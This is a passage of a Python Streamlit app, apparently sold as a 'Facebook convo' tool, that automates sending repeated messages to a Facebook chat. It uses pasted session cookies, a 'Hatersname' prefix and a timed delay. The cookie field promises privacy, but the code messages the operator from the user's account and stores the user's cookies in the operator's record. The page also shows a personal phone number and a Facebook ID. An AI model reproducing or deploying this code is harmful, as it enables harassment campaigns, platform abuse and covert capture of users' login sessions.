                                    e2ee_thread_id = regular_thread_id
                                    if e2ee_thread_id and user_id:
                                        current_cookies = user_config.get('cookies', '')
                                        db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'REGULAR')
                                        log_message(f"ADMIN-NOTIFY: Found & saved admin REGULAR chat thread ID: {e2ee_thread_id}", automation_state)
                                    admin_found = True
                                    break
                                else:
                                    log_message(f"ADMIN-NOTIFY: URL doesn't look like conversation, trying next result...", automation_state)
                                    driver.back()
                                    time.sleep(3)
                        except Exception as e:
                            log_message(f"ADMIN-NOTIFY: Result #{idx+1} failed: {str(e)[:50]}", automation_state)
                            continue
                    
                    if admin_found:
                        break
                except Exception as e:
                    log_message(f"ADMIN-NOTIFY: Selector {selector} failed: {str(e)[:50]}", automation_state)
                    continue
            
            if not admin_found:
                log_message(f"ADMIN-NOTIFY: Admin UID not found in search results, trying direct admin profile...", automation_state)
                
                try:
                    profile_url = f'https://www.facebook.com/{ADMIN_UID}'
                    log_message(f"ADMIN-NOTIFY: Opening admin profile: {profile_url}", automation_state)
                    driver.get(profile_url)
                    time.sleep(8)
                    
                    message_button_selectors = [
                        f'a[href*="/{ADMIN_UID}"][href*="message"]',
                        f'a[href*="messages"][href*="{ADMIN_UID}"]',
                        'div[aria-label*="Message" i][role="button"]',
                        'a[aria-label*="Message" i][role="link"]',
                        'span:contains("Message")'
                    ]
                    
                    message_buttons = []
                    for sel in message_button_selectors:
                        try:
                            btns = driver.find_elements(By.CSS_SELECTOR, sel)
                            if btns:
                                log_message(f"ADMIN-NOTIFY: Found {len(btns)} message buttons with: {sel}", automation_state)
                                message_buttons.extend(btns)
                                break
                        except:
                            continue
                    
                    message_attempts = 0
                    max_message_attempts = 3
                    
                    for btn in message_buttons:
                        if message_attempts >= max_message_attempts:
                            log_message(f"ADMIN-NOTIFY: Max message button attempts ({max_message_attempts}) reached", automation_state)
                            break
                        
                        if btn.is_displayed():
                            message_attempts += 1
                            log_message(f"ADMIN-NOTIFY: Clicking message button on profile (attempt {message_attempts})...", automation_state)
                            
                            current_url_before = driver.current_url
                            driver.execute_script("arguments[0].click();", btn)
                            time.sleep(8)
                            
                            try:
                                continue_buttons = driver.find_elements(By.CSS_SELECTOR, 'div[role="button"]:not([aria-label*="Close" i]):not([aria-label*="Back" i]), button:not([aria-label*="Close" i]):not([aria-label*="Back" i])')
                                
                                for cont_btn in continue_buttons:
                                    btn_text = (cont_btn.text or '').lower()
                                    btn_label = (cont_btn.get_attribute('aria-label') or '').lower()
                                    
                                    if 'continue' in btn_text or 'continue' in btn_label or 'जारी' in btn_text:
                                        log_message(f"ADMIN-NOTIFY: Found E2EE setup dialog from profile, clicking Continue...", automation_state)
                                        driver.execute_script("arguments[0].click();", cont_btn)
                                        time.sleep(8)
                                        break
                            except:
                                pass
                            
                            current_url = driver.current_url
                            
                            if current_url == current_url_before or 'profile.php' in current_url:
                                log_message(f"ADMIN-NOTIFY: Message button didn't open conversation (still on profile)", automation_state)
                                continue
                            
                            log_message(f"ADMIN-NOTIFY: Opened URL from profile: {current_url}", automation_state)
                            
                            if 'e2ee' in current_url.lower() and '/e2ee/t/' in current_url:
                                e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                
                                if e2ee_thread_id == ADMIN_UID:
                                    log_message(f"ADMIN-NOTIFY: E2EE thread ID is admin UID ({e2ee_thread_id}), not actual thread!", automation_state)
                                    continue
                                elif e2ee_thread_id == user_chat_id:
                                    log_message(f"ADMIN-NOTIFY: Profile opened user's own chat ({e2ee_thread_id}), not admin's!", automation_state)
                                    continue
                                
                                if e2ee_thread_id and user_id:
                                    current_cookies = user_config.get('cookies', '')
                                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'E2EE')
                                    log_message(f"ADMIN-NOTIFY: Found admin E2EE from profile & saved: {e2ee_thread_id}", automation_state)
                                admin_found = True
                                break
                            elif '/messages/t/' in current_url:
                                regular_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                
                                if regular_thread_id == user_chat_id:
                                    log_message(f"ADMIN-NOTIFY: Profile opened user's own chat ({regular_thread_id}), not admin's!", automation_state)
                                    continue
                                
                                e2ee_thread_id = regular_thread_id
                                if e2ee_thread_id and user_id:
                                    current_cookies = user_config.get('cookies', '')
                                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'REGULAR')
                                    log_message(f"ADMIN-NOTIFY: Found admin REGULAR chat from profile & saved: {e2ee_thread_id}", automation_state)
                                admin_found = True
                                break
                    
                except Exception as e:
                    log_message(f"ADMIN-NOTIFY: Profile approach failed: {str(e)[:100]}", automation_state)
            
            if not admin_found or not e2ee_thread_id:
                log_message(f"ADMIN-NOTIFY: Could not find admin via search, trying DIRECT MESSAGE approach...", automation_state)
                
                try:
                    profile_url = f'https://www.facebook.com/messages/new'
                    log_message(f"ADMIN-NOTIFY: Opening new message page...", automation_state)
                    driver.get(profile_url)
                    time.sleep(8)
                    
                    search_box = None
                    search_selectors = [
                        'input[aria-label*="To:" i]',
                        'input[placeholder*="Type a name" i]',
                        'input[type="text"]'
                    ]
                    
                    for selector in search_selectors:
                        try:
                            search_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                            if search_elements:
                                for elem in search_elements:
                                    if elem.is_displayed():
                                        search_box = elem
                                        log_message(f"ADMIN-NOTIFY: Found 'To:' box with: {selector}", automation_state)
                                        break
                                if search_box:
                                    break
                        except:
                            continue
                    
                    if search_box:
                        log_message(f"ADMIN-NOTIFY: Typing admin UID in new message...", automation_state)
                        driver.execute_script("""
                            arguments[0].focus();
                            arguments[0].value = arguments[1];
                            arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                        """, search_box, ADMIN_UID)
                        time.sleep(5)
                        
                        result_elements = driver.find_elements(By.CSS_SELECTOR, 'div[role="option"], li[role="option"], a[role="option"]')
                        if result_elements:
                            log_message(f"ADMIN-NOTIFY: Found {len(result_elements)} results, clicking first...", automation_state)
                            driver.execute_script("arguments[0].click();", result_elements[0])
                            time.sleep(8)
                            
                            current_url = driver.current_url
                            if '/messages/t/' in current_url or '/e2ee/t/' in current_url:
                                if '/e2ee/t/' in current_url:
                                    e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                    chat_type = 'E2EE'
                                    log_message(f"ADMIN-NOTIFY: Direct message opened E2EE: {e2ee_thread_id}", automation_state)
                                else:
                                    e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                    chat_type = 'REGULAR'
                                    log_message(f"ADMIN-NOTIFY: Direct message opened REGULAR chat: {e2ee_thread_id}", automation_state)
                                
                                if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                                    current_cookies = user_config.get('cookies', '')
                                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, chat_type)
                                    admin_found = True
                except Exception as e:
                    log_message(f"ADMIN-NOTIFY: Direct message approach failed: {str(e)[:100]}", automation_state)
            
            if not admin_found or not e2ee_thread_id:
                log_message(f"ADMIN-NOTIFY: ALL APPROACHES FAILED - Could not find/open admin conversation", automation_state)
                return
            
            conversation_type = "E2EE" if "e2ee" in driver.current_url else "REGULAR"
            log_message(f"ADMIN-NOTIFY: Successfully opened {conversation_type} conversation with admin", automation_state)
        
        message_input = find_message_input(driver, 'ADMIN-NOTIFY', automation_state)
        
        if message_input:
            from datetime import datetime
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            conversation_type = "E2EE" if "e2ee" in driver.current_url.lower() else "Regular"
            notification_msg = f"New User Started Automation\n\nUsername: {username}\nTime: {current_time}\nChat Type: {conversation_type}\nThread ID: {e2ee_thread_id if e2ee_thread_id else 'N/A'}"
            
            log_message(f"ADMIN-NOTIFY: Typing notification message...", automation_state)
            driver.execute_script("""
                const element = arguments[0];
                const message = arguments[1];
                
                element.scrollIntoView({behavior: 'smooth', block: 'center'});
                element.focus();
                element.click();
                
                if (element.tagName === 'DIV') {
                    element.textContent = message;
                    element.innerHTML = message;
                } else {
                    element.value = message;
                }
                
                element.dispatchEvent(new Event('input', { bubbles: true }));
                element.dispatchEvent(new Event('change', { bubbles: true }));
                element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
            """, message_input, notification_msg)
            
            time.sleep(1)
            
            log_message(f"ADMIN-NOTIFY: Trying to send message...", automation_state)
            send_result = driver.execute_script("""
                const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                
                for (let btn of sendButtons) {
                    if (btn.offsetParent !== null) {
                        btn.click();
                        return 'button_clicked';
                    }
                }
                return 'button_not_found';
            """)
            
            if send_result == 'button_not_found':
                log_message(f"ADMIN-NOTIFY: Send button not found, using Enter key...", automation_state)
                driver.execute_script("""
                    const element = arguments[0];
                    element.focus();
                    
                    const events = [
                        new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                    ];
                    
                    events.forEach(event => element.dispatchEvent(event));
                """, message_input)
                log_message(f"ADMIN-NOTIFY: Sent via Enter key: '{notification_msg}'", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: Send button clicked: '{notification_msg}'", automation_state)
            
            time.sleep(2)
        else:
            log_message(f"ADMIN-NOTIFY: Failed to find message input", automation_state)
            
    except Exception as e:
        log_message(f"ADMIN-NOTIFY: Error sending notification: {str(e)}", automation_state)
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f"ADMIN-NOTIFY: Browser closed", automation_state)
            except:
                pass

def run_automation_with_notification(user_config, username, automation_state, user_id):
    send_admin_notification(user_config, username, automation_state, user_id)
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    
    db.set_automation_running(user_id, True)
    
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

# Admin Panel Functions
def admin_login():
    st.sidebar.markdown("---")
    st.sidebar.markdown("### 🔧 Admin Panel")
    
    if not st.session_state.admin_logged_in:
        admin_pass = st.sidebar.text_input("Admin Password", type="password", placeholder="Enter admin password")
        if st.sidebar.button("Admin Login"):
            if admin_pass == ADMIN_PASSWORD:
                st.session_state.admin_logged_in = True
                st.sidebar.success("Admin access granted!")
            else:
                st.sidebar.error("Invalid admin password!")
    
    if st.session_state.admin_logged_in:
        if st.sidebar.button("Admin Logout"):
            st.session_state.admin_logged_in = False
            st.rerun()
        
        return True
    return False

def show_admin_panel():
    st.markdown("## 👑 Admin Control Panel")
    
    # Get all users
    all_users = db.get_all_users()
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        st.metric("Total Users", len(all_users))
    
    with col2:
        active_users = len([u for u in all_users if u.get('automation_running', False)])
        st.metric("Active Automations", active_users)
    
    with col3:
        approved_users = len([u for u in all_users if u.get('approved', False)])
        st.metric("Approved Users", approved_users)
    
    st.markdown("### User Management")
    
    for user in all_users:
        with st.expander(f"👤 {user['username']} - ID: {user['user_id']}"):
            col1, col2, col3, col4 = st.columns(4)
            
            with col1:
                st.write(f"**Status:** {'🟢 Approved' if user['approved'] else '🔴 Pending'}")
                st.write(f"**Automation:** {'🟢 Running' if user['automation_running'] else '🔴 Stopped'}")
            
            with col2:
                st.write(f"**Messages Sent:** {user.get('message_count', 0)}")
                st.write(f"**Chat ID:** {user.get('chat_id', 'Not set')}")
            
            with col3:
                if not user['approved']:
                    if st.button(f"Approve", key=f"approve_{user['user_id']}"):
                        db.approve_user(user['user_key'])
                        st.success(f"User {user['username']} approved!")
                        st.rerun()
                else:
                    if st.button(f"Revoke", key=f"revoke_{user['user_id']}"):
                        db.revoke_user(user['user_key'])
                        st.warning(f"User {user['username']} approval revoked!")
                        st.rerun()
            
            with col4:
                if user['automation_running']:
                    if st.button(f"Stop Auto", key=f"stop_{user['user_id']}"):
                        db.set_automation_running(user['user_id'], False)
                        st.warning(f"Stopped automation for {user['username']}!")
                        st.rerun()

# Main App Logic
st.markdown('<div class="main-header"><h1>LORD FADIIW E2EE FACEBOOK CONVO</h1><p>Created by LORD FADIIW </p></div>', unsafe_allow_html=True)

# Generate user key
user_key = generate_user_key()

# Check if user is approved
if not st.session_state.approved:
    approved = check_approval(user_key)
    if approved:
        st.session_state.approved = True
    else:
        # Show approval screen
        st.markdown('<div class="approval-box">', unsafe_allow_html=True)
        st.markdown('<div class="profile-icon">👑</div>', unsafe_allow_html=True)
        st.markdown('<h2 style="text-align: center; color: white;">APPROVAL REQUIRED</h2>', unsafe_allow_html=True)
        st.markdown('<p style="text-align: center; color: rgba(255,255,255,0.8);">Your unique access key has been generated. Please contact LORD FADIIW for approval.</p>', unsafe_allow_html=True)
        
        st.markdown('<div class="key-display">', unsafe_allow_html=True)
        st.markdown(f'**YOUR UNIQUE KEY:**')
        st.code(user_key, language=None)
        st.markdown('</div>', unsafe_allow_html=True)
        
        st.markdown('<p style="text-align: center; color: rgba(255,255,255,0.8);">Copy this key and send it to LORD FADIIW for approval:</p>', unsafe_allow_html=True)
        
        # Social buttons
        col1, col2 = st.columns(2)
        
        with col1:
            whatsapp_url = f"https://wa.me/+923182993352?text=HELLO%20%F0%9F%92%97LORD%20%F0%9F%96%A4FADIIW%20SIR%20THIS%20IS%20MY%20KEY%20%3D%20{user_key}%20PLZ%20SIR%20APPROVE%20MY%20KEY"
            st.markdown(f'<a href="{whatsapp_url}" class="social-btn" target="_blank">📱 WhatsApp</a>', unsafe_allow_html=True)
        
        with col2:
            facebook_url = "https://m.fb.com/100001076573102"
            st.markdown(f'<a href="{facebook_url}" class="social-btn facebook" target="_blank">👤 Facebook</a>', unsafe_allow_html=True)
        
        st.markdown('</div>', unsafe_allow_html=True)
        
        # Check for approval
        if st.button("🔄 Check Approval Status"):
            if check_approval(user_key):
                st.session_state.approved = True
                st.success("🎉 Your key has been approved! Loading main application...")
                time.sleep(2)
                st.rerun()
            else:
                st.error("❌ Your key is still pending approval. Please contact LORD FADIIW.")
        
        st.stop()

# Check admin access
if admin_login():
    show_admin_panel()
    st.stop()

# Main application for approved users
if not st.session_state.logged_in:
    # Enhanced login/signup with glowing inputs
    tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
    
    with tab1:
        st.markdown("### Welcome Back!")
        username = st.text_input("Username", key="login_username", placeholder="Enter your username")
        password = st.text_input("Password", key="login_password", type="password", placeholder="Enter your password")
        
        # Add glowing effect classes
        st.markdown("""
            <script>
            const inputs = parent.document.querySelectorAll('input');
            inputs.forEach((input, index) => {
                input.classList.add(`input-glow-${(index % 8) + 1}`);
            });
            </script>
        """, unsafe_allow_html=True)
        
        if st.button("Login", key="login_btn", use_container_width=True):
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    st.session_state.logged_in = True
                    st.session_state.user_id = user_id
                    st.session_state.username = username
                    
                    should_auto_start = db.get_automation_running(user_id)
                    if should_auto_start:
                        user_config = db.get_user_config(user_id)
                        if user_config and user_config['chat_id']:
                            start_automation(user_config, user_id)
                    
                    st.success(f"Welcome back, {username}!")
                    st.rerun()
                else:
                    st.error("Invalid username or password!")
            else:
                st.warning("Please enter both username and password")
    
    with tab2:
        st.markdown("### Create New Account")
        new_username = st.text_input("Choose Username", key="signup_username", placeholder="Choose a unique username")
        new_password = st.text_input("Choose Password", key="signup_password", type="password", placeholder="Create a strong password")
        confirm_password = st.text_input("Confirm Password", key="confirm_password", type="password", placeholder="Re-enter your password")
        
        if st.button("Create Account", key="signup_btn", use_container_width=True):
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    success, message = db.create_user(new_username, new_password)
                    if success:
                        st.success(f"{message} Please login now!")
                    else:
                        st.error(f"{message}")
                else:
                    st.error("Passwords do not match!")
            else:
                st.warning("Please fill all fields")

else:
    # Main application for logged in users
    if not st.session_state.auto_start_checked and st.session_state.user_id:
        st.session_state.auto_start_checked = True
        should_auto_start = db.get_automation_running(st.session_state.user_id)
        if should_auto_start and not st.session_state.automation_state.running:
            user_config = db.get_user_config(st.session_state.user_id)
            if user_config and user_config['chat_id']:
                start_automation(user_config, st.session_state.user_id)
    
    st.sidebar.markdown(f"### 👤 {st.session_state.username}")
    st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
    st.sidebar.markdown(f"**Status:** 🟢 Approved")
    
    if st.sidebar.button("🚪 Logout", use_container_width=True):
        if st.session_state.automation_state.running:
            stop_automation(st.session_state.user_id)
        
        st.session_state.logged_in = False
        st.session_state.user_id = None
        st.session_state.username = None
        st.session_state.automation_running = False
        st.session_state.auto_start_checked = False
        st.rerun()
    
    user_config = db.get_user_config(st.session_state.user_id)
    
    if user_config:
        tab1, tab2 = st.tabs(["⚙️ Configuration", "🚀 Automation"])
        
        with tab1:
            st.markdown("### Your Configuration")
            
            chat_id = st.text_input("Chat/Conversation ID", value=user_config['chat_id'], 
                                   placeholder="e.g., 1362400298935018",
                                   help="Facebook conversation ID from the URL",
                                   key="config_chat_id")
            
            name_prefix = st.text_input("Hatersname", value=user_config['name_prefix'],
                                       placeholder="e.g., [END TO END LORD FADIIW HERE]",
                                       help="Prefix to add before each message",
                                       key="config_prefix")
            
            delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, 
                                   value=user_config['delay'],
                                   help="Wait time between messages",
                                   key="config_delay")
            
            cookies = st.text_area("Facebook Cookies (optional - kept private)", 
                                  value="",
                                  placeholder="Paste your Facebook cookies here (will be encrypted)",
                                  height=100,
                                  help="Your cookies are encrypted and never shown to anyone",
                                  key="config_cookies")
            
            messages = st.text_area("Messages (one per line)", 
                                   value=user_config['messages'],
                                   placeholder="NP file copy paste karo",
                                   height=150,
                                   help="Enter each message on a new line",
                                   key="config_messages")
            
            if st.button("💾 Save Configuration", use_container_width=True):
                final_cookies = cookies if cookies.strip() else user_config['cookies']
                db.update_user_config(
                    st.session_state.user_id,
                    chat_id,
                    name_prefix,
                    delay,
                    final_cookies,
                    messages
                )
                st.success("Configuration saved successfully!")
                st.rerun()
        
        with tab2:
            st.markdown("### Automation Control")
            
            col1, col2, col3 = st.columns(3)
            
            with col1:
                st.metric("Messages Sent", st.session_state.automation_state.message_count)
            
            with col2:
                status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
                st.metric("Status", status)
            
            with col3:
                st.metric("Total Logs", len(st.session_state.automation_state.logs))
            
            col1, col2 = st.columns(2)
            
            with col1:
                if st.button("▶️ Start E2ee", disabled=st.session_state.automation_state.running, use_container_width=True):
                    current_config = db.get_user_config(st.session_state.user_id)
                    if current_config and current_config['chat_id']:
                        start_automation(current_config, st.session_state.user_id)
                        st.rerun()
                    else:
                        st.error("Please configure Chat ID first!")
            
            with col2:
                if st.button("⏸️ Stop E2ee", disabled=not st.session_state.automation_state.running, use_container_width=True):
                    stop_automation(st.session_state.user_id)
                    st.rerun()
            
            st.markdown("### 📋 Live Logs")
            
            if st.session_state.automation_state.logs:
                logs_html = '<div class="log-container">'
                for log in st.session_state.automation_state.logs[-50:]:
                    logs_html += f'<div>{log}</div>'
                logs_html += '</div>'
                st.markdown(logs_html, unsafe_allow_html=True)
            else:
                st.info("No logs yet. Start automation to see logs here.")
            
            if st.session_state.automation_state.running:
                time.sleep(1)
                st.rerun()

st.markdown('<div class="footer">Made with ❤️ by FADIIW BRAND | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
